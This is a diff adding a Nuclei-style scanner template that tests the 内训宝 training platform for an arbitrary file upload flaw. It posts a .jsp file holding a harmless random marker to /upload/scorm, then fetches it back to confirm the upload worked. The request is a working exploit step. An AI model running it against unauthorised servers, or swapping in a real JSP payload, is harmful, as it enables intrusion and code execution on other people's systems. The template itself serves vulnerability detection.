@@ -1,0 +1,55 @@
+id: poc-yaml-nxb-etp-scorm-anyfile-upload
+info:
+  name: 内训宝企业培训平台 scorm 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_text_alphanumeric(5)}}'
+  t2: '{{base64(t1)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /upload/scorm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="fileupload"; filename="{{t1}}.jsp"
+        Content-Type: application/octet-stream
+
+        {{t2}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".jsp"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "upload/imgdefault/common/(.*?).jsp"
+        internal: true
+
+  - raw:
+      - |
+        GET /upload/imgdefault/common/{{file}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
